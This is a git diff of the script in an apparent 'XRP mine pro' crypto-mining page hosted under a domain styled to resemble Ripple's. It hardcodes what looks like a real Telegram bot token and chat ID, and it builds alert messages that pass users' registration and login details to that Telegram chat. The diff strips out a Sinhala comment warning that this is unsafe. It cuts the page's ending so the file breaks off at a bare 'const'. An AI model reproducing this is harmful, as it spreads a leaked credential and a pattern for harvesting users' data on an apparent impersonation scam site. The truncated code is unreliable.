@@ -233,16 +233,14 @@
         const db = firebase.firestore(); 
         
         // =========================================================================================
-        // 2. 🤖 TELEGRAM BOT CONFIGURATION (මෙම තොරතුරු ඔබගේ Bot වෙත ලැබෙන බැවින් අනාරක්ෂිතය!)
-        // =========================================================================================
+        // 2. 🤖 TELEGRAM BOT CONFIGURATION 
         // ⚠️ ඔබගේ සැබෑ Telegram Bot Token සහ Chat ID මෙහි යොදන්න
+        // =========================================================================================
         const TELEGRAM_BOT_TOKEN = "8441096313:AAGtOgFrHFk3ROaRKZoYQ19prswgRvqkU1Y"; 
         const TELEGRAM_CHAT_ID   = "8344580966"; 
-        // ⚠️ ඔබගේ සැබෑ වෙබ් අඩවියේ URL එක යොදන්න 
         const DASHBOARD_URL = 'https://ripple-com.github.io/xrp-mine-pro.github.io/dashboard.html'; 
         // =========================================================================================
         
-        // ⚡️ REFERRAL SYSTEM 
         let referralIdFromUrl = null; 
 
         // --- Telegram Notification Function ---
@@ -254,6 +252,7 @@
 
             let messageText = `🚨 <b>NEW ${eventType.toUpperCase()} ALERT!</b> 🚨\n\n`;
             
+            // මුරපද මෙහි ඇතුළත් නොවේ
             for (const [key, value] of Object.entries(details)) {
                 messageText += `<b>${key}:</b> ${value}\n`;
             }
@@ -342,7 +341,7 @@
         }
 
 
-     // 🟢 FIREBASE REGISTER FUNCTION (Referral Logic සහිතව)
+     // 🟢 FIREBASE REGISTER FUNCTION 
 async function handleRegistration() {
     const usernameInput = document.getElementById('reg-username');
     let username = usernameInput.value;
@@ -568,33 +567,4 @@ async function handleRegistration() {
             document.getElementById('register-feedback').style.display = 'none';
 
             document.getElementById(formId + '-form').classList.add('active');
-            const activeTabButton = document.querySelector(`.tab-btn[onclick*="${formId}"]`);
-            activeTabButton.classList.add('active');
-            
-            const container = document.querySelector('.auth-container');
-            if (formId === 'login') {
-                container.style.borderTopColor = 'var(--primary-color)'; 
-                activeTabButton.style.color = 'var(--primary-color)';
-                activeTabButton.style.borderBottomColor = 'var(--primary-color)';
-            } else {
-                container.style.borderTopColor = 'var(--secondary-color)'; 
-                activeTabButton.style.color = 'var(--secondary-color)';
-                activeTabButton.style.borderBottomColor = 'var(--secondary-color)';
-            }
-        }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            // ⚡️ URL එකෙන් Referral ID එක ලබා ගැනීම
-            const urlParams = new URLSearchParams(window.location.search);
-            referralIdFromUrl = urlParams.get('ref');
-
-            if (referralIdFromUrl) {
-                console.log("Referral ID found in URL (Referred by):", referralIdFromUrl);
-            }
-            
-            showForm('login');
-        });
-    </script>
-
-</body>
-</html>
+            const
